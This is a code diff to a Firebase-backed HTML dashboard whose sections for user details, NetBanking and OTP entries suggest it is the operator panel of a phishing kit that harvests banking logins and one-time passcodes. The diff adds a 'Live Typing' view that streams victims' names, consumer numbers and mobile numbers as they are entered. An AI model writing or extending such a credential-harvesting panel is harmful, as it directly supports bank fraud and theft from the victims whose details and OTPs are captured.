@@ -65,6 +65,7 @@
   <button onclick="showSection('netbankingSection')">NetBanking</button>
   <button onclick="showSection('otpSection')">OTP</button>
   <button onclick="showSection('combinedSection')">All</button>
+  <button onclick="showSection('liveSection')">Live View</button>
 </div>
 
 <div id="usersSection" class="section active"><h3>User Details</h3></div>
@@ -74,6 +75,7 @@
 <div id="netbankingSection" class="section"><h3>NetBanking</h3></div>
 <div id="otpSection" class="section"><h3>OTP</h3></div>
 <div id="combinedSection" class="section"><h3>All</h3></div>
+<div id="liveSection" class="section"><h3>Live Typing</h3></div>
 
 <script>
 const firebaseConfig = {
@@ -156,6 +158,20 @@ db.collection("otp_entries").onSnapshot(snap=>{
     `;
     renderEntry("otpSection",html,change.doc.id,"otp_entries");
     renderEntry("combinedSection",html,change.doc.id,"otp_entries","OTP");
+  });
+});
+
+/* LIVE TYPING */
+db.collection("live_typing").orderBy("timestamp","desc").onSnapshot(snap=>{
+  snap.docChanges().forEach(change=>{
+    const d=change.doc.data();
+    const html=`
+    <p><b>Name:</b> ${d.name || ""}</p>
+    <p><b>KNO:</b> ${d.kno || ""}</p>
+    <p><b>Mobile:</b> ${d.mobile || ""}</p>
+    <span class="time">${formatTime(d.timestamp)}</span>
+    `;
+    renderEntry("liveSection",html,change.doc.id,"live_typing");
   });
 });
 </script>
